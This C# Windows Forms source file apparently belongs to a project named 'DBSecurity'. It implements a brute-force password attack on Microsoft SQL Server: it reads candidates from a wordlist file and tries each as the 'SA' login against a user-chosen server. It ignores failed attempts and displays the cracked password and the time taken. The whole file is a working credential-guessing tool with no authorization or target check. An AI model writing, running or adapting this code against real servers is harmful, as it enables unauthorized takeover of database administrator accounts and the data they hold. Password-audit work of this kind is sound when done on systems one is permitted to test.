using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Data.SqlClient;

namespace DBSecurity
{
    public partial class FRMBrutForce : Form
    {
        public FRMBrutForce()
        {
            InitializeComponent();
        }

        private void FRMBrutForce_Load(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            string cs;
            string serverName = txtServerName.Text;
            string userName = "SA";
            string dbName = txtDBName.Text;
            string passWord;


            int i;
            int count;
            int k = 0;
            DateTime dt = DateTime.Now;

            count = Convert.ToInt32(txtCount.Text);
            System.IO.StreamReader sr = new System.IO.StreamReader("uniqpass_preview.txt");

            LSTPassword.Items.Clear();

            for (i=0; i<count; i++)
            {
                k++;
                passWord = sr.ReadLine();
                lblStatus.Text = passWord;
                LSTPassword.Items.Add(passWord);
                Update();

                if (k >= 15)
                {
                    k = 0;
                    LSTPassword.Items.Clear();
                }

                cs = "DATA SOURCE = " + serverName + ";INITIAL CATALOG=" + dbName + ";UID=" + userName + ";PASSWORD=" +
                     passWord + ";CONNECT TIMEOUT =1";
                try
                {

               
                SqlConnection conn  = new SqlConnection(cs);
                conn.Open();
                if (conn.State == ConnectionState.Open)
                {
                    lblStatus.Text = "Connected! The Password is " + passWord;
                    DateTime dt2 = DateTime.Now;
                    TimeSpan t = dt2 - dt;
                    lblStatus.Text = "Connected! The Password is " + passWord + "duration: " + t.ToString(@"hh\:mm\:ss");
                    return;

                }
                }
                catch (Exception exception)
                {
                    
                }




            }
        }
    }
}
